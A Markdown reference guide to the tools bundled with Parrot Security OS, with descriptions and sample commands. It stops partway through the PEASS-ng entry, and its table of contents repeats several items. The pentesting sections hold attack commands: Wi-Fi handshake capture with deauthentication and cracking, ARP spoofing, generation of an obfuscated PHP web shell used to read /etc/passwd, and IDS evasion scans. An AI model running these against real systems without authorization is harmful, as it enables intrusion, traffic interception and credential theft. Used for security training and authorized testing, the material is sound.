# 🦜 Parrot Security OS — Complete Tools & Software Reference Guide

> **Author:** Generated from live Parrot OS application menu screenshots  
> **Version:** Parrot OS 6.x / 7.0 (Echo)  
> **Purpose:** Complete reference notes for every tool and software installed in Parrot Security OS  
> **Last Updated:** 2025–2026  
> **⚠️ Legal Notice:** All tools documented here are for **authorized security testing, research, and education ONLY**. Unauthorized use is illegal worldwide.

---

## 📋 Table of Contents

1. [Privacy & Anonymity](#1-privacy--anonymity)
2. [Development Tools](#2-development-tools)
3. [Graphics](#3-graphics)
4. [Internet & Networking](#4-internet--networking)
5. [Office & Productivity](#5-office--productivity)
6. [Pentesting — Most Used Tools](#6-pentesting--most-used-tools)
7. [Pentesting — Information Gathering](#7-pentesting--information-gathering)
8. [Pentesting — Vulnerability Analysis](#8-pentesting--vulnerability-analysis)
9. [Pentesting — Web Application Analysis](#9-pentesting--web-application-analysis)
10. [Pentesting — Exploitation Tools](#10-pentesting--exploitation-tools)
11. [Pentesting — Maintaining Access](#11-pentesting--maintaining-access)
12. [Pentesting — Post Exploitation](#12-pentesting--post-exploitation)
13. [Pentesting — Password Attacks](#13-pentesting--password-attacks)
14. [Pentesting — Wireless Testing](#14-pentesting--wireless-testing)
15. [Pentesting — Sniffing & Spoofing](#15-pentesting--sniffing--spoofing)
16. [Pentesting — Digital Forensics](#16-pentesting--digital-forensics)
17. [Pentesting — Automotive](#17-pentesting--automotive)
18. [Pentesting — Reverse Engineering](#18-pentesting--reverse-engineering)
19. [Pentesting — Reporting Tools](#19-pentesting--reporting-tools)
20. [Pentesting — AI Tools](#20-pentesting--ai-tools)
21. [Black Hat & Gray Hat Techniques](#bonus-black-hat--gray-hat-techniques-reference)
22. [System Tools](#23-system-tools)
23. [System Services](#24-system-services)
24. [Utilities](#25-utilities)
25. [Science & Math](#26-science--math)
26. [Multimedia](#27-multimedia)
27. [Power / Session](#28-power--session-management)
28. [Full Cheatsheet](#29-complete-quick-reference-command-cheatsheet)
17. [Pentesting — Automotive](#17-pentesting--automotive)
18. [Pentesting — Reverse Engineering](#18-pentesting--reverse-engineering)
19. [Pentesting — Reporting Tools](#19-pentesting--reporting-tools)
20. [Pentesting — AI Tools](#20-pentesting--ai-tools)
21. [Learning Roadmap](#21-learning-roadmap)
22. [Useful Resources](#22-useful-resources)

---

## 1. Privacy & Anonymity

> Tools to protect your identity, anonymize your traffic, and securely delete sensitive data.

---

### 🔐 AnonSurf

| Field | Details |
|-------|---------|
| **Category** | Privacy |
| **Type** | Anonymization Toolkit |
| **Skill Level** | Beginner |
| **GUI Available** | Yes (AnonSurf GUI / GTK) |

**Description:**  
AnonSurf is Parrot's built-in anonymization wrapper written in **Nim language**. It forces ALL system traffic through the **Tor network** using iptables rules — not just your browser, but every application. It supports both a CLI and a friendly GTK GUI.

**Key Features:**
- Routes all traffic through Tor transparent proxy
- Start / Stop / Restart anonymization with one command
- Change Tor identity (switch exit nodes) on demand
- Check your current public IP through Tor
- DNS leak protection using OpenNIC DNS servers
- GUI shows real-time Tor statistics and bandwidth

**CLI Commands:**
```bash
anonsurf start          # Start anonymous mode (routes all traffic through Tor)
anonsurf stop           # Stop anonymous mode
anonsurf restart        # Restart Tor connection
anonsurf changeid       # Switch to a new Tor exit node (new identity)
anonsurf status         # Check if AnonSurf is running
anonsurf myip           # Show your current public IP (should show Tor exit IP)
anonsurf dns            # Switch DNS to OpenNIC anonymous DNS servers
```

**How It Works:**
AnonSurf modifies **iptables** rules to redirect all outgoing traffic through Tor's SOCKS proxy. Tor routes your traffic through 3 nodes: Guard → Relay → Exit. Your real IP is never exposed to the destination server.

**Use Cases:**
- Anonymous web browsing and research
- Protecting identity during security assessments
- Bypassing geo-restrictions and censorship
- Operational security (OpSec) during pentests

---

### 🔑 Cryptography Tools

| Field | Details |
|-------|---------|
| **Category** | Privacy |
| **Type** | Encryption Suite |
| **Skill Level** | Beginner–Intermediate |

**Description:**  
Parrot's Cryptography submenu includes tools for encrypting files, managing PGP keys, and securing communications. Core tools include **GnuPG (GPG)**, **OpenSSL**, and GUI frontends.

**GnuPG (GPG) Commands:**
```bash
gpg --gen-key                              # Generate a new key pair
gpg --list-keys                            # List all public keys
gpg --encrypt -r recipient@email.com file.txt   # Encrypt a file
gpg --decrypt file.txt.gpg                 # Decrypt a file
gpg --sign document.txt                    # Sign a document
gpg --verify document.txt.sig              # Verify a signature
gpg --export -a "Your Name" > public.key   # Export your public key
```

**OpenSSL Commands:**
```bash
openssl genrsa -out private.key 2048          # Generate RSA private key
openssl req -new -key private.key -out csr.csr  # Create certificate signing request
openssl s_client -connect target.com:443      # Test SSL/TLS connection
openssl enc -aes-256-cbc -in file -out file.enc  # Encrypt file with AES-256
openssl dgst -sha256 file.txt                 # Generate SHA256 hash of file
```

---

### 🧹 Metadata Cleaner

| Field | Details |
|-------|---------|
| **Category** | Privacy |
| **Type** | Metadata Removal Tool |
| **Skill Level** | Beginner |
| **GUI Available** | Yes |

**Description:**  
Metadata Cleaner removes hidden metadata from files before sharing them. Images, documents, and PDFs often embed sensitive information like author name, GPS coordinates, device model, and timestamps that can expose your identity.

**What it removes:**
- EXIF data from images (GPS location, camera model, timestamps)
- Author and revision history from documents
- Printer fingerprints from PDFs
- Software version info from files

**CLI Alternative (ExifTool):**
```bash
exiftool -all= image.jpg          # Remove all metadata from image
exiftool image.jpg                 # View all metadata in a file
exiftool -GPS:all= photo.jpg      # Remove only GPS data
mat2 document.pdf                  # Remove metadata using mat2
```

---

### 🗑️ Secure File Deleter

| Field | Details |
|-------|---------|
| **Category** | Privacy |
| **Type** | Secure Deletion Tool |
| **Skill Level** | Beginner |

**Description:**  
Standard file deletion only removes the file's reference in the filesystem — the actual data remains on disk and can be recovered with forensic tools. Secure File Deleter overwrites the data multiple times before deletion, making recovery impossible.

**CLI Commands (Shred / Wipe):**
```bash
shred -vzu -n 35 sensitive_file.txt    # Overwrite 35 times then delete
shred -v /dev/sdX                       # Securely wipe an entire drive
wipe -rf /path/to/directory/            # Recursively wipe a directory
srm -rf /path/to/file                   # Secure remove (like rm but overwrites)
```

---

## 2. Development Tools

> IDEs, code editors, API clients, database browsers, and version control tools.

---

### 💻 Visual Studio Code (VS Code)

| Field | Details |
|-------|---------|
| **Category** | Development |
| **Type** | Code Editor / IDE |
| **Skill Level** | Beginner |

**Description:**  
Microsoft's VS Code is the most popular code editor in the world. It supports hundreds of languages with syntax highlighting, IntelliSense autocomplete, Git integration, debugging, and a massive extension marketplace. Ideal for writing exploit scripts, automation tools, and web applications.

**Key Features:**
- Multi-language support (Python, JavaScript, Bash, Go, Rust, etc.)
- Integrated terminal
- Git/GitHub integration
- Remote SSH development (connect to servers)
- Extensions for pentesting (Python, Docker, REST Client)

```bash
code .                    # Open current directory in VS Code
code filename.py          # Open specific file
```

---

### 💻 VSCodium

| Field | Details |
|-------|---------|
| **Category** | Development |
| **Type** | Code Editor (Privacy-focused VS Code) |
| **Skill Level** | Beginner |

**Description:**  
VSCodium is VS Code but with all Microsoft telemetry and tracking removed. It's built from the same open-source code but without the proprietary Microsoft branding and data collection. Preferred for privacy-conscious developers.

---

### ✏️ Geany

| Field | Details |
|-------|---------|
| **Category** | Development |
| **Type** | Lightweight Text Editor / IDE |
| **Skill Level** | Beginner |

**Description:**  
Geany is a fast, lightweight IDE that starts instantly and uses minimal resources. Perfect for editing scripts, config files, and code on systems with limited RAM.

```bash
geany script.py           # Open file in Geany
geany &                   # Launch Geany in background
```

---

### ✏️ Kate

| Field | Details |
|-------|---------|
| **Category** | Development |
| **Type** | Advanced Text Editor (KDE) |
| **Skill Level** | Beginner |

**Description:**  
Kate is KDE's advanced text editor with multi-document interface, syntax highlighting for 300+ languages, Vi input mode, terminal plugin, and powerful search/replace with regex support.

---

### 🗄️ DBeaver Community

| Field | Details |
|-------|---------|
| **Category** | Development |
| **Type** | Universal Database Client |
| **Skill Level** | Beginner–Intermediate |

**Description:**  
DBeaver is a free universal database tool supporting MySQL, PostgreSQL, SQLite, Oracle, MSSQL, and 100+ others. Essential for examining captured/exfiltrated databases during pentests, analyzing database structures, and running SQL queries with a GUI.

**Use in Pentesting:**
- Examine databases extracted via SQL injection
- Browse SQLite files from compromised applications
- Visualize database relationships and schemas

---

### 🗄️ DB Browser for SQLite

| Field | Details |
|-------|---------|
| **Category** | Development |
| **Type** | SQLite Database GUI |
| **Skill Level** | Beginner |

**Description:**  
A high quality, visual, open source tool to create, design, and edit SQLite database files. Many mobile apps, browsers, and applications use SQLite — this tool lets you inspect them directly.

**Pentesting Use:**
```bash
# Open SQLite database file from a compromised Android app
# Browsers store passwords, cookies, history in SQLite
~/.mozilla/firefox/profile/cookies.sqlite   # Firefox cookies
~/.config/google-chrome/Default/Cookies      # Chrome cookies
```

---

### 🌐 Insomnia

| Field | Details |
|-------|---------|
| **Category** | Development |
| **Type** | API Testing Client |
| **Skill Level** | Beginner–Intermediate |

**Description:**  
Insomnia is a powerful REST/GraphQL/gRPC API client. Used to test and interact with web APIs, inspect responses, set custom headers, and manage authentication tokens. Invaluable for API security testing.

**Pentesting Use:**
- Test API endpoints for authentication bypass
- Manually craft requests to test for injection vulnerabilities
- Test JWT token manipulation
- Inspect API responses for sensitive data exposure

---

### 📬 Postman

| Field | Details |
|-------|---------|
| **Category** | Development |
| **Type** | API Development & Testing Platform |
| **Skill Level** | Beginner–Intermediate |

**Description:**  
Industry-standard API testing tool. Allows you to send HTTP/HTTPS requests, inspect responses, automate API tests, and manage collections of requests. Similar to Insomnia but with more collaboration features.

```bash
# Postman is GUI-only, launch from menu
# Key features for security testing:
# - Intercepting and modifying requests
# - Testing authentication mechanisms
# - Fuzzing API parameters
# - Environment variables for different targets
```

---

### 🔌 Requestly API Client

| Field | Details |
|-------|---------|
| **Category** | Development |
| **Type** | HTTP Interceptor & API Client |
| **Skill Level** | Beginner |

**Description:**  
Requestly is an HTTP interceptor and API client that can modify, redirect, and mock HTTP requests. Useful for testing how web applications handle modified requests and headers.

---

### 🔀 Git Cola / Git DAG

| Field | Details |
|-------|---------|
| **Category** | Development |
| **Type** | Git GUI Clients |
| **Skill Level** | Beginner |

**Description:**  
Git Cola is a sleek, powerful Git GUI. Git DAG provides a visual representation of your Git repository's commit history as a Directed Acyclic Graph. Essential for managing exploit code, scripts, and security tool repositories.

```bash
git clone https://github.com/repo/tool.git    # Clone a security tool
git pull                                        # Update a tool
git log --oneline --graph                       # View commit history
```

---

### 📝 Logseq

| Field | Details |
|-------|---------|
| **Category** | Development / Office |
| **Type** | Knowledge Management / Note-taking |
| **Skill Level** | Beginner |

**Description:**  
Logseq is an open-source knowledge management tool with bi-directional linking. Perfect for taking structured notes during penetration tests, documenting findings, and building a personal security knowledge base.

**Pentesting Use:**
- Document findings during engagements
- Track discovered credentials and vulnerabilities
- Build a personal wiki of attack techniques
- Link related findings together

---

### 🔀 Meld

| Field | Details |
|-------|---------|
| **Category** | Development |
| **Type** | Visual Diff & Merge Tool |
| **Skill Level** | Beginner |

**Description:**  
Meld is a visual diff and merge tool for files and directories. Useful for comparing exploit code versions, analyzing changes in configuration files, and comparing captured data.

```bash
meld file1.txt file2.txt     # Compare two files side by side
meld dir1/ dir2/              # Compare two directories
```

---

## 3. Graphics

---

### 🎨 GNU Image Manipulation Program (GIMP)

| Field | Details |
|-------|---------|
| **Category** | Graphics |
| **Type** | Image Editor |
| **Skill Level** | Beginner |

**Description:**  
GIMP is a powerful free image editor, comparable to Photoshop. In security contexts, it can be used to analyze images for steganography, manipulate screenshots for reports, or create social engineering materials (phishing pages, fake IDs for authorized red team exercises).

**Security Use Cases:**
- Analyze images for hidden data (steganography)
- Create professional-looking phishing materials (authorized use only)
- Crop and annotate screenshots for pentest reports

---

## 4. Internet & Networking

---

### 🔥 Brave Web Browser

| Field | Details |
|-------|---------|
| **Category** | Internet |
| **Type** | Privacy-Focused Web Browser |
| **Skill Level** | Beginner |

**Description:**  
Brave is a Chromium-based browser with built-in ad blocking, tracker blocking, and fingerprint randomization. It includes a built-in Tor window for anonymous browsing without needing AnonSurf. Preferred by security professionals for its privacy features.

**Key Features:**
- Blocks ads and trackers by default
- Built-in Tor Private Window
- HTTPS Everywhere enforcement
- Fingerprint randomization
- No data sent to Google

---

### 🦊 Firefox ESR

| Field | Details |
|-------|---------|
| **Category** | Internet |
| **Type** | Web Browser (Extended Support Release) |
| **Skill Level** | Beginner |

**Description:**  
Firefox ESR (Extended Support Release) is the stable, long-term support version of Firefox. Used by security professionals because it's compatible with security-focused extensions like FoxyProxy, uBlock Origin, Cookie Editor, and Wappalyzer.

**Essential Security Extensions:**
- **FoxyProxy** — Switch between proxy profiles (Burp Suite, Tor)
- **Wappalyzer** — Detect technologies used by websites
- **Cookie Editor** — Inspect and modify cookies
- **uBlock Origin** — Block ads and trackers
- **HackBar** — Quick SQL injection and XSS testing in browser

---

### 🧅 Tor Browser

| Field | Details |
|-------|---------|
| **Category** | Internet / Privacy |
| **Type** | Anonymous Browser |
| **Skill Level** | Beginner |

**Description:**  
Tor Browser is a modified Firefox that routes all traffic through the Tor network automatically. It includes NoScript, HTTPS-Only mode, and fingerprint resistance. The most secure way to browse anonymously.

**Tor Network Basics:**
- Traffic goes through 3 encrypted relays: Guard → Middle → Exit
- Each relay only knows the previous and next hop
- Exit relay sends traffic to the destination
- New circuit every 10 minutes by default

```bash
tor-browser                  # Launch Tor Browser
torbrowser-launcher          # Tor Browser launcher/updater
```

---

### 🧅 OnionShare

| Field | Details |
|-------|---------|
| **Category** | Internet / Privacy |
| **Type** | Anonymous File Sharing |
| **Skill Level** | Beginner–Intermediate |

**Description:**  
OnionShare creates a temporary onion (.onion) web server on the Tor network to share files anonymously. The recipient only needs Tor Browser to download. No third-party service involved — files go directly peer-to-peer through Tor.

**Use Cases:**
- Share sensitive files anonymously during engagements
- Receive files from confidential sources
- Host an anonymous website temporarily

```bash
onionshare /path/to/file     # Share a file via Tor
onionshare --receive         # Create a dropbox for receiving files
onionshare --website /dir/   # Host a temporary website
```

---

### 🔌 qBittorrent

| Field | Details |
|-------|---------|
| **Category** | Internet |
| **Type** | BitTorrent Client |
| **Skill Level** | Beginner |

**Description:**  
Open-source BitTorrent client. Used to download security tools, wordlists, and datasets distributed via torrents (e.g., large wordlist collections, security conference recordings).

---

### 🖥️ Remmina

| Field | Details |
|-------|---------|
| **Category** | Internet |
| **Type** | Remote Desktop Client |
| **Skill Level** | Beginner–Intermediate |

**Description:**  
Remmina is a feature-rich remote desktop client supporting RDP, VNC, SSH, SPICE, and NX protocols. Used during pentests to connect to compromised Windows systems via RDP, or to manage remote Linux servers via SSH.

```bash
remmina                      # Launch GUI
remmina -c rdp://target.com  # Connect directly to RDP
```

---

### 🖥️ xfreerdp3

| Field | Details |
|-------|---------|
| **Category** | Internet |
| **Type** | RDP Client (CLI) |
| **Skill Level** | Intermediate |

**Description:**  
xfreerdp3 is a CLI Remote Desktop Protocol client. Faster and more scriptable than Remmina for automated connections during pentests.

```bash
xfreerdp3 /v:target.com /u:Administrator /p:password123 /cert:ignore
xfreerdp3 /v:10.10.10.1 /u:admin /p:pass /drive:share,/tmp /dynamic-resolution
```

---

## 5. Office & Productivity

---

### 📚 LibreOffice Suite

| Field | Details |
|-------|---------|
| **Category** | Office |
| **Type** | Office Suite |
| **Skill Level** | Beginner |

**Description:**  
LibreOffice is a free, open-source office suite. In security contexts, it's used for writing pentest reports, creating documentation, analyzing Office documents for macros/malware, and creating professional deliverables.

| Application | Purpose |
|------------|---------|
| **LibreOffice Writer** | Word processor — write pentest reports |
| **LibreOffice Calc** | Spreadsheet — organize findings, track assets |
| **LibreOffice Impress** | Presentations — client briefings |
| **LibreOffice Draw** | Diagrams — network maps, attack flow diagrams |
| **LibreOffice Math** | Mathematical formulas |

**Security Use — Analyzing Malicious Documents:**
```bash
# Analyze macros in Office documents
olevba malicious.docx         # Extract VBA macros
oletools                       # Analyze OLE files (doc, xls, ppt)
```

---

### 📖 Okular

| Field | Details |
|-------|---------|
| **Category** | Office |
| **Type** | Document Viewer |
| **Skill Level** | Beginner |

**Description:**  
Okular is KDE's universal document viewer supporting PDF, EPUB, PostScript, and more. Used to read security research papers, CVE reports, and documentation.

---

### 📇 KAddressBook

| Field | Details |
|-------|---------|
| **Category** | Office |
| **Type** | Contact Manager |
| **Skill Level** | Beginner |

**Description:**  
KDE's address book application for managing contacts. Useful during OSINT engagements for organizing discovered contact information about targets.

---

## 6. Pentesting — Most Used Tools

> The essential tools every Parrot OS user should master first.

---

### 🗺️ aircrack-ng

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Most Used / Wireless |
| **Type** | Wi-Fi Security Auditing Suite |
| **Skill Level** | Intermediate |

**Description:**  
Aircrack-ng is the gold standard suite for Wi-Fi security auditing. It can capture WPA/WPA2 handshakes and crack them using wordlists or brute force, crack WEP keys, and perform various wireless attacks.

**Complete Workflow:**
```bash
# Step 1: Put wireless adapter into monitor mode
airmon-ng start wlan0

# Step 2: Scan for nearby networks
airodump-ng wlan0mon

# Step 3: Capture handshake from specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Step 4: Force client to reconnect (deauthentication attack)
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Step 5: Crack the captured handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# WEP cracking (legacy networks)
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon  # ARP replay attack
aircrack-ng capture-01.cap                      # Crack WEP key
```

**Suite Components:**
- `airmon-ng` — Enable/disable monitor mode
- `airodump-ng` — Packet capture and network scanning
- `aireplay-ng` — Packet injection (deauth, replay attacks)
- `aircrack-ng` — WEP/WPA key cracker
- `airdecap-ng` — Decrypt WEP/WPA packets
- `airbase-ng` — Create rogue access points

---

### 🛡️ armitage

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Most Used / Metasploit |
| **Type** | Metasploit GUI Frontend |
| **Skill Level** | Beginner–Intermediate |

**Description:**  
Armitage is a graphical cyber attack management tool for Metasploit. It visualizes targets, recommends exploits automatically, and provides a point-and-click interface for the Metasploit Framework. Great for beginners learning Metasploit concepts.

```bash
armitage       # Launch Armitage (requires Metasploit PostgreSQL DB running)
# Services needed first:
sudo service postgresql start
sudo msfdb init
```

**Key Features:**
- Visual network map of discovered hosts
- Automatic exploit suggestion (Hail Mary attack)
- Team collaboration features
- Session management GUI
- Post-exploitation menu

---

### 🌊 bettercap

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Most Used / Sniffing |
| **Type** | Network Attack & Monitoring Framework |
| **Skill Level** | Intermediate |

**Description:**  
Bettercap is a powerful, flexible, and portable framework for network attacks and monitoring. It's the modern replacement for ettercap, supporting Wi-Fi, Bluetooth, HID, Ethernet, and more.

```bash
sudo bettercap -iface eth0        # Start on specific interface

# Within bettercap interactive console:
net.probe on                       # Discover hosts on network
net.show                           # Show discovered hosts
arp.spoof on                       # Enable ARP spoofing (MitM)
net.sniff on                       # Start sniffing traffic
https.proxy on                     # Enable HTTPS proxy
caplets.show                       # List available caplets (scripts)

# Wi-Fi scanning
wifi.recon on                      # Scan for Wi-Fi networks
wifi.show                          # Display found networks

# Capture PMKID without client
wifi.assoc all                     # Attack all visible APs
```

---

### 🕷️ Burp Suite Community Edition (Burpsuite CE)

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Most Used / Web |
| **Type** | Web Application Security Testing Platform |
| **Skill Level** | Intermediate–Advanced |

**Description:**  
Burp Suite is the industry-standard platform for web application security testing. The Community Edition includes the Proxy (intercept and modify HTTP/HTTPS traffic), Repeater (manually resend requests), Intruder (automated fuzzing), Decoder, and Sequencer.

**Setting Up Burp Suite:**
```
1. Launch Burp Suite
2. Go to Proxy > Options > set listener to 127.0.0.1:8080
3. Configure browser to use proxy 127.0.0.1:8080
4. Install Burp's CA certificate in browser (http://burp)
5. Browse target site — all traffic appears in HTTP history
```

**Key Modules:**
| Module | Purpose |
|--------|---------|
| **Proxy** | Intercept and modify requests/responses in real-time |
| **Repeater** | Manually modify and resend individual requests |
| **Intruder** | Automated attack with payloads (fuzzing, brute force) |
| **Scanner** | Automated vulnerability scanning (Pro version) |
| **Decoder** | Encode/decode Base64, URL, HTML, hex |
| **Sequencer** | Analyze randomness of session tokens |
| **Comparer** | Diff two requests or responses |

**Common Attacks:**
```
SQL Injection: Modify parameter, send to Repeater, test payloads
XSS: Inject <script>alert(1)</script> in parameters
IDOR: Change user ID in request to access other users' data
JWT Manipulation: Decode JWT in Decoder, modify claims, test
```

---

### 🎯 Caido

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Most Used / Web |
| **Type** | Web Security Auditing Tool |
| **Skill Level** | Intermediate |

**Description:**  
Caido is a modern web security auditing tool, similar to Burp Suite but built with a modern web UI. It features an HTTP proxy, replayer, automate (fuzzing), and HTTPQL query language for searching through traffic. Lightweight and fast.

```bash
caido                    # Launch Caido
# Web interface available at http://localhost:8080
```

---

### 🐛 edb-debugger

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Most Used / Reverse Engineering |
| **Type** | Linux Binary Debugger |
| **Skill Level** | Advanced |

**Description:**  
EDB (Evan's Debugger) is a Linux debugger inspired by OllyDbg for Windows. It provides a GUI for debugging ELF binaries, examining memory, setting breakpoints, and analyzing how programs execute. Essential for binary exploitation and reverse engineering.

```bash
edb --run /path/to/binary    # Debug a binary
edb --attach PID             # Attach to running process
```

---

### 📁 gobuster

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Most Used / Web |
| **Type** | Directory/File/DNS Brute-forcer |
| **Skill Level** | Beginner–Intermediate |

**Description:**  
Gobuster brute-forces URIs, DNS subdomains, virtual hostnames, and Amazon S3 buckets. Much faster than dirb/dirbuster due to multi-threading.

```bash
# Directory/file brute forcing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# DNS subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Virtual host discovery
gobuster vhost -u http://target.com -w /usr/share/wordlists/subdomains.txt

# S3 bucket enumeration
gobuster s3 -w /usr/share/wordlists/bucket-names.txt

# Common flags:
# -t 50          — use 50 threads (faster)
# -x php,html    — look for specific extensions
# -o output.txt  — save results to file
# -k             — skip SSL certificate verification
```

---

### 🔑 johnny

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Most Used / Password |
| **Type** | John the Ripper GUI Frontend |
| **Skill Level** | Beginner |

**Description:**  
Johnny is the official graphical user interface for John the Ripper. It makes password cracking accessible without memorizing command-line options.

---

### 🕵️ Maltego

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Most Used / OSINT |
| **Type** | OSINT & Link Analysis Platform |
| **Skill Level** | Intermediate–Advanced |

**Description:**  
Maltego is a visual intelligence and link analysis tool. It maps relationships between people, companies, domains, IP addresses, phone numbers, and social networks using "transforms" that query public data sources automatically.

```bash
maltego          # Launch Maltego
```

**Core Concepts:**
- **Entity** — A node (person, domain, IP, organization)
- **Transform** — A query that finds related entities
- **Graph** — The visual map of relationships

**Common Transforms:**
- Domain → DNS records, subdomains, MX records
- Person → Email addresses, social profiles, phone numbers
- IP → Hosting provider, associated domains, geolocation
- Organization → Employees, subsidiaries, technology stack

**Use Cases:**
- Map an organization's entire digital footprint
- Find email addresses of employees for phishing assessment
- Discover all subdomains and IP ranges
- Build social network maps for social engineering assessments

---

### 🔓 ophcrack

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Most Used / Password |
| **Type** | Windows Password Cracker (Rainbow Tables) |
| **Skill Level** | Beginner–Intermediate |

**Description:**  
Ophcrack cracks Windows LM and NTLM password hashes using precomputed rainbow tables. Extremely fast for common passwords — no brute force needed.

```bash
ophcrack                         # Launch GUI
ophcrack -t /path/to/tables/     # Specify rainbow tables directory
```

---

### 🕸️ owasp-zap (OWASP ZAP)

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Most Used / Web |
| **Type** | Web Application Security Scanner |
| **Skill Level** | Beginner–Intermediate |

**Description:**  
OWASP ZAP (Zed Attack Proxy) is the world's most widely used web application security scanner. Free, open-source, and actively maintained by OWASP. It includes active/passive scanning, spider, fuzzer, and an intercepting proxy.

```bash
owasp-zap           # Launch ZAP
zap.sh -daemon -port 8090 -config api.key=yourkey  # Run as daemon
```

**Key Features:**
- Automated scanner for OWASP Top 10 vulnerabilities
- Spider (crawls the entire website)
- Forced Browse (brute-force hidden content)
- Active scan (tests for SQL injection, XSS, etc.)
- API scanning support
- CI/CD integration via ZAP CLI

---

### 🐚 webshells

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Most Used |
| **Type** | Web Shell Collection |
| **Skill Level** | Intermediate |

**Description:**  
A collection of web shells in PHP, ASP, JSP, and other languages. Web shells are scripts uploaded to a compromised web server to maintain access and execute commands remotely. Parrot includes reference copies for authorized testing.

```bash
ls /usr/share/webshells/         # Browse available webshells
ls /usr/share/webshells/php/     # PHP web shells
# Common ones: php-reverse-shell.php, simple-backdoor.php
```

---

### 🐍 weevely

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Most Used |
| **Type** | Stealth Web Shell |
| **Skill Level** | Intermediate |

**Description:**  
Weevely is a stealthy PHP web shell generator and manager. It generates obfuscated PHP agents that communicate covertly with the attacker. Mimics HTTP traffic to avoid detection.

```bash
weevely generate secretpassword /tmp/shell.php   # Generate obfuscated PHP shell
weevely http://target.com/shell.php secretpassword  # Connect to deployed shell

# Once connected, weevely shell commands:
:help                    # List available modules
:file.ls                 # List directory contents
:file.read /etc/passwd   # Read sensitive files
:system.info             # Get system information
:net.scan                # Network scanning from inside target
```

---

### 🦈 wireshark

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Most Used / Forensics |
| **Type** | Network Protocol Analyzer |
| **Skill Level** | Beginner–Advanced |

**Description:**  
Wireshark is the world's most popular network protocol analyzer. It captures and displays packets in real-time with deep inspection of hundreds of protocols. Essential for network troubleshooting, forensics, and traffic analysis.

```bash
wireshark                         # Launch GUI
wireshark -i eth0                 # Capture on specific interface
tshark -i eth0 -w capture.pcap   # CLI version (tshark)
tshark -r capture.pcap            # Read a capture file

# Useful display filters:
# http                            — Show only HTTP traffic
# dns                             — Show only DNS queries
# tcp.port == 443                 — Show HTTPS traffic
# ip.addr == 192.168.1.1         — Filter by IP address
# http.request.method == "POST"  — Show only POST requests
# ftp                             — FTP credentials in cleartext
```

**What to Look For:**
- Cleartext credentials in HTTP, FTP, Telnet traffic
- DNS queries revealing internal infrastructure
- Suspicious outbound connections (malware C2)
- Unusual protocols or port usage
- Broadcast traffic revealing network topology

---

## 7. Pentesting — Information Gathering

> Passive and active reconnaissance tools to map the target before attacking.

---

### 🔭 Information Gathering Overview

Information gathering is the first phase of any penetration test. It's divided into:
- **Passive** — No direct contact with target (OSINT, public records)
- **Active** — Direct interaction with target (port scanning, DNS queries)

**Key tools in Parrot OS for this category** (accessed via Pentesting → Information Gathering):
- `nmap` — Network scanning and port discovery
- `theHarvester` — Email, subdomain, and employee harvesting
- `maltego` — Visual OSINT link analysis (see above)
- `recon-ng` — Modular OSINT framework
- `dnsenum` — DNS enumeration
- `whois` — Domain registration information
- `dmitry` — Deep magic information gathering
- `netdiscover` — ARP-based network scanner
- `masscan` — Ultra-fast port scanner
- `fierce` — DNS reconnaissance tool
- `sublist3r` — Subdomain enumeration

**Nmap — The Essential Scanner:**
```bash
# Basic host discovery
nmap -sn 192.168.1.0/24                    # Ping scan (find live hosts)

# Port scanning
nmap -sS target.com                         # SYN scan (stealth)
nmap -sT target.com                         # TCP connect scan
nmap -sU target.com                         # UDP scan
nmap -p 1-65535 target.com                  # Scan all ports
nmap -p 80,443,8080 target.com             # Scan specific ports

# Service and version detection
nmap -sV target.com                         # Detect service versions
nmap -A target.com                          # Aggressive scan (OS, versions, scripts)
nmap -O target.com                          # OS detection

# NSE Scripts
nmap --script=vuln target.com              # Run all vuln detection scripts
nmap --script=http-enum target.com         # Enumerate web directories
nmap --script=smb-vuln-ms17-010 target.com # Check for EternalBlue

# Output formats
nmap -oN output.txt target.com             # Normal output
nmap -oX output.xml target.com             # XML output
nmap -oG output.gnmap target.com           # Grepable output
nmap -oA output target.com                 # All formats

# Timing and evasion
nmap -T0 target.com   # Paranoid (slowest, stealthiest)
nmap -T4 target.com   # Aggressive (fast, common in CTFs)
nmap -D RND:10 target.com  # Decoy scan with random IPs
nmap -f target.com    # Fragment packets to evade IDS
```

**theHarvester:**
```bash
theHarvester -d target.com -b google        # Google search
theHarvester -d target.com -b all           # All sources
theHarvester -d target.com -b linkedin      # LinkedIn employees
theHarvester -d target.com -b shodan        # Shodan (needs API key)
```

**DNSenum:**
```bash
dnsenum target.com                           # Full DNS enumeration
dnsenum --dnsserver 8.8.8.8 target.com      # Use specific DNS server
dnsenum --enum target.com                   # Perform zone transfer attempt
```

---

## 8. Pentesting — Vulnerability Analysis

---

### 🔍 Nessus

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Vulnerability Analysis |
| **Type** | Professional Vulnerability Scanner |
| **Skill Level** | Intermediate |

**Description:**  
Nessus is the world's most trusted vulnerability scanner, used by over 30,000 organizations. It checks for known CVEs, misconfigurations, default credentials, and compliance issues across networks, systems, and applications.

```bash
sudo service nessusd start           # Start Nessus daemon
# Access web interface: https://localhost:8834
# Default credentials: set during installation
```

---

### 📊 peass (PEASS-ng)

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Vulnerability Analysis / Post Exploitation |
| **Type** | Privilege Escalation Enumeration Scripts |
| **Skill Level** | Intermediate |

**Description:**  
